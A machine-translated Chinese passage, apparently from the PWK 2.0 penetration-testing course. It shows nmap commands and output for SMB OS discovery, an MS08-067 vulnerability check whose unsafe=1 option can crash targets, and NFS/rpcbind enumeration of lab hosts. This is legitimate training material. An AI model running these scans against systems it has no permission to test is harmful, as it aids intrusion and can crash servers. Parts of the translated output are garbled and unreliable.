<div style="position:absolute;top:231586;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/share/nmap/scripts/smb-os-discovery.nse</font></font></nobr></div>
<div style="position:absolute;top:231603;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:231622;left:310"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 252 - 查找各种 nmap SMB NSE 脚本</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:231687;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">210 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/NetBIOS</font></font></font></nobr></div>
<div style="position:absolute;top:231707;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">211 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/NetBIOS_over_TCP/IP</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:231835;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="196"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 196 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:231868;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:232945;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:232945;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:232945;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">196</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:231964;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这里，我们发现了几个有趣的 Nmap SMB NSE 脚本，它们执行各种任务，例如 OS</font></font></nobr></div>
<div style="position:absolute;top:231983;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过 SMB 进行发现和枚举。</font></font></nobr></div>
<div style="position:absolute;top:232016;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们试试</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">smb-os-discovery</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:232051;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nmap -v -p 139, 445 --script=smb-os-discovery 10.11.1.227</font></font></font></b></nobr></div>
<div style="position:absolute;top:232068;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:232085;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.227 的 Nmap 扫描报告</font></font></nobr></div>
<div style="position:absolute;top:232102;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机已启动（0.57 秒延迟）。</font></font></nobr></div>
<div style="position:absolute;top:232119;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口国服务</font></font></nobr></div>
<div style="position:absolute;top:232136;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">139/tcp 打开 netbios-ssn</font></font></nobr></div>
<div style="position:absolute;top:232170;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机脚本结果：</font></font></nobr></div>
<div style="position:absolute;top:232187;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">smb-os-发现：</font></font></nobr></div>
<div style="position:absolute;top:232204;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">操作系统：Windows 2000（Windows 2000 LAN 管理器）</font></font></nobr></div>
<div style="position:absolute;top:232221;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">操作系统 CPE：cpe:/o:microsoft:windows_2000::-</font></font></nobr></div>
<div style="position:absolute;top:232237;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">计算机名称：srv2</font></font></nobr></div>
<div style="position:absolute;top:232254;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">NetBIOS 计算机名称：SRV2</font></font></nobr></div>
<div style="position:absolute;top:232271;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">工作组：工作组</font></font></nobr></div>
<div style="position:absolute;top:232289;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:232308;left:258"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 253 - 使用 nmap 脚本引擎执行操作系统发现</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:232337;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此特定脚本确定了主机操作系统的潜在匹配项。</font></font></nobr></div>
<div style="position:absolute;top:232370;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要检查已知的 SMB 协议漏洞，我们可以调用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">smb-vuln</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> NSE 脚本之一。</font></font></nobr></div>
<div style="position:absolute;top:232389;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将看看</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">smb-vuln-ms08-067</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，它使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--script-args</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项传递</font></font></nobr></div>
<div style="position:absolute;top:232409;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NSE 脚本的参数。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:232471;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意：如果我们设置脚本参数</font></font></i><b><font color="#000000" style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">unsafe=1</font></font></font></b><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，将运行的脚本是</font></font></i></nobr></div>
<div style="position:absolute;top:232490;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">几乎（或完全）保证会使易受攻击的系统崩溃。</font><font style="vertical-align: inherit;">不用说，</font></font></i></nobr></div>
<div style="position:absolute;top:232510;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在启用此参数时要格外小心，尤其是当</font></font></i></nobr></div>
<div style="position:absolute;top:232529;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描生产系统。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:232593;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.1</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:232610;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.1.5</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:232627;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 2019-03-04 11:27 EST 开始 Nmap 7.70 ( https://nmap.org )</font></font></nobr></div>
<div style="position:absolute;top:232644;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NSE：加载了 1 个用于扫描的脚本。</font></font></nobr></div>
<div style="position:absolute;top:232661;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NSE：脚本预扫描。</font></font></nobr></div>
<div style="position:absolute;top:232678;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:232695;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描 10.11.1.5 [2 个端口]</font></font></nobr></div>
<div style="position:absolute;top:232712;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:232729;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 00:04 完成 NSE，已过去 17.39 秒</font></font></nobr></div>
<div style="position:absolute;top:232746;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.5 的 Nmap 扫描报告</font></font></nobr></div>
<div style="position:absolute;top:232763;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机已启动（0.17 秒延迟）。</font></font></nobr></div>
<div style="position:absolute;top:232780;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口国服务</font></font></nobr></div>
<div style="position:absolute;top:232797;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">139/tcp 打开 netbios-ssn</font></font></nobr></div>
<div style="position:absolute;top:232813;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">445/tcp 打开 microsoft-ds</font></font></nobr></div>
<div style="position:absolute;top:232831;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MAC 地址：00:50:56:AF:02:91 (VMware)</font></font></nobr></div>
<div style="position:absolute;top:232865;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机脚本结果：</font></font></nobr></div>
<div style="position:absolute;top:232882;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">smb-vuln-ms08-067：</font></font></nobr></div>
<div style="position:absolute;top:232898;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">易受伤害的：</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:233023;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="197"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 197 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:233056;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:234133;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:234133;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:234133;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">197</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:233152;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">Microsoft Windows 系统易受远程代码执行攻击 (MS08-067)</font></font></nobr></div>
<div style="position:absolute;top:233168;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|     </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">状态：易受攻击</font></font></font></b></nobr></div>
<div style="position:absolute;top:233185;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">ID：CVE:CVE-2008-4250</font></font></nobr></div>
<div style="position:absolute;top:233202;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|    </font></font></nobr></div>
<div style="position:absolute;top:233202;left:206"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows 2000 SP4、XP SP2 和 SP3、Server 2 中的服务器服务</font></font></nobr></div>
<div style="position:absolute;top:233220;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|    </font></font></nobr></div>
<div style="position:absolute;top:233220;left:206"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Vista Gold 和 SP1、Server 2008 和 7 Pre-Beta 允许远程攻击者</font></font></nobr></div>
<div style="position:absolute;top:233236;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|    </font></font></nobr></div>
<div style="position:absolute;top:233236;left:206"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过精心制作的 RPC 请求在路径 cano 期间触发溢出的代码</font></font></nobr></div>
<div style="position:absolute;top:233253;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:233270;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">披露日期：2008-10-23</font></font></nobr></div>
<div style="position:absolute;top:233287;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">参考：</font></font></nobr></div>
<div style="position:absolute;top:233304;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250</font></font></nobr></div>
<div style="position:absolute;top:233321;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_ https://technet.microsoft.com/en-us/library/security/ms08-067.aspx</font></font></nobr></div>
<div style="position:absolute;top:233338;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:233358;left:218"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 254 - 确定主机是否容易受到 MS08_067 漏洞的影响</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:233387;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这种情况下，Nmap 确定特定 SMB 服务缺少至少一个关键补丁</font></font></nobr></div>
<div style="position:absolute;top:233406;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MS08-067 </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">212</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:233441;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.3.2.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:233471;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 使用 Nmap 列出实验室中运行 Windows 的 SMB 服务器。</font></font></nobr></div>
<div style="position:absolute;top:233499;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 使用 NSE 脚本扫描这些系统中的 SMB 漏洞。</font></font></nobr></div>
<div style="position:absolute;top:233527;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 对这些系统使用 nbtscan 和 enum4linux 来识别您可以识别的数据类型</font></font></nobr></div>
<div style="position:absolute;top:233547;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从不同版本的 Windows 获取。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:233584;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.4 NFS 枚举</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:233626;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络文件系统 (NFS) </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">213</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是最初由 Sun 开发的分布式文件系统协议</font></font></nobr></div>
<div style="position:absolute;top:233645;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsystems 于 1984 年。它允许客户端计算机上的用户通过计算机访问文件</font></font></nobr></div>
<div style="position:absolute;top:233664;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络就好像它们在本地安装的存储上一样。</font></font></nobr></div>
<div style="position:absolute;top:233697;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NFS 经常与 UNIX 操作系统一起使用，并且主要是不安全的</font></font></nobr></div>
<div style="position:absolute;top:233717;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行。</font><font style="vertical-align: inherit;">安全设置可能有些困难，因此找到 NFS 并不罕见</font></font></nobr></div>
<div style="position:absolute;top:233736;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">股票向世界开放。</font><font style="vertical-align: inherit;">这对我们作为渗透测试人员来说非常方便，因为我们可能</font></font></nobr></div>
<div style="position:absolute;top:233755;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">能够利用它们来收集敏感信息、提升我们的权限等。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:233790;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.4.1 扫描 NFS 共享</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:233828;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这两个</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端口映射</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">214</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RPCBIND </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">215</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上的TCP端口111 RPCBIND运行RPC服务映射到端口</font></font></nobr></div>
<div style="position:absolute;top:233847;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">他们听什么。</font><font style="vertical-align: inherit;">RPC 进程在启动时通知 rpcbind，注册它们所在的端口</font></font></nobr></div>
<div style="position:absolute;top:233866;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">监听和他们期望服务的 RPC 程序编号。</font></font></nobr></div>
<div style="position:absolute;top:233899;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后，客户端系统使用特定的 RPC 程序编号联系服务器上的 rpcbind。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:233919;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">rpcbind 服务将客户端重定向到正确的端口号（通常是 TCP 端口 2049），以便它可以</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:234009;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">212 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2008 年），http://technet.microsoft.com/en-us/security/bulletin/ms08-067</font></font></font></nobr></div>
<div style="position:absolute;top:234029;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">213 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Network_File_System</font></font></font></nobr></div>
<div style="position:absolute;top:234049;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">214 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2017 年），https://en.wikipedia.org/wiki/Portmap</font></font></font></nobr></div>
<div style="position:absolute;top:234069;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">215 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（红帽，2019 年），https://access.redhat.com/documentation/en-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:234084;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">us/red_hat_enterprise_linux/6/html/storage_administration_guide/s2-nfs-methodology-portmap </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:234211;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="198"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 198 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:234244;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:235321;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:235321;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:235321;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">198</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:234340;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与请求的服务通信。</font><font style="vertical-align: inherit;">我们可以</font><font style="vertical-align: inherit;">使用以下命令</font><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nmap</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描这些端口</font></font></nobr></div>
<div style="position:absolute;top:234359;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">句法：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:234394;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nmap -v -p 111 10.11.1.1-254</font></font></font></b></nobr></div>
<div style="position:absolute;top:234413;left:228"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 255 - 使用 nmap 识别运行 portmapper/rpcbind 的主机</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:234443;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用像</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">rpcinfo</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这样的 NSE 脚本</font><font style="vertical-align: inherit;">来查找可能已经注册到 rpcbind 的服务：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:234478;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254</font></font></font></b></nobr></div>
<div style="position:absolute;top:234495;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:234512;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.72 的 Nmap 扫描报告</font></font></nobr></div>
<div style="position:absolute;top:234529;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机已启动（0.0055 秒延迟）。</font></font></nobr></div>
<div style="position:absolute;top:234563;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口国服务版本</font></font></nobr></div>
<div style="position:absolute;top:234580;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">111/tcp 打开 rpcbind 2-4 (RPC #100000)</font></font></nobr></div>
<div style="position:absolute;top:234597;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">rpc信息：</font></font></nobr></div>
<div style="position:absolute;top:234613;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">程序版本端口/原型服务</font></font></nobr></div>
<div style="position:absolute;top:234630;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">100000 2,3,4    </font></font></nobr></div>
<div style="position:absolute;top:234630;left:311"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">111/tcp rpcbind</font></font></nobr></div>
<div style="position:absolute;top:234647;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">100000 2,3,4    </font></font></nobr></div>
<div style="position:absolute;top:234647;left:311"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">111/udp rpcbind</font></font></nobr></div>
<div style="position:absolute;top:234664;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">100003 2,3,4 2049/tcp nfs</font></font></nobr></div>
<div style="position:absolute;top:234682;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">100003 2,3,4 2049/udp nfs</font></font></nobr></div>
<div style="position:absolute;top:234698;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">100005 1,2,3 50255/udp 挂载</font></font></nobr></div>
<div style="position:absolute;top:234715;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">100005 1,2,3 56911/tcp 挂载</font></font></nobr></div>
<div style="position:absolute;top:234732;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">100021 1,3,4 40160/udp nlockmgr</font></font></nobr></div>
<div style="position:absolute;top:234749;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">100021 1,3,4 57765/tcp nlockmgr</font></font></nobr></div>
<div style="position:absolute;top:234766;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">100024 1    </font></font></nobr></div>
<div style="position:absolute;top:234766;left:295"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">34959/udp 状态</font></font></nobr></div>
<div style="position:absolute;top:234783;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">100024 1    </font></font></nobr></div>
<div style="position:absolute;top:234783;left:295"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">46908/tcp 状态</font></font></nobr></div>
<div style="position:absolute;top:234800;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">100227 2,3    </font></font></nobr></div>
<div style="position:absolute;top:234800;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2049/tcp nfs_acl</font></font></nobr></div>
<div style="position:absolute;top:234817;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_ 100227 2,3    </font></font></nobr></div>
<div style="position:absolute;top:234817;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2049/udp nfs_acl</font></font></nobr></div>
<div style="position:absolute;top:234834;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
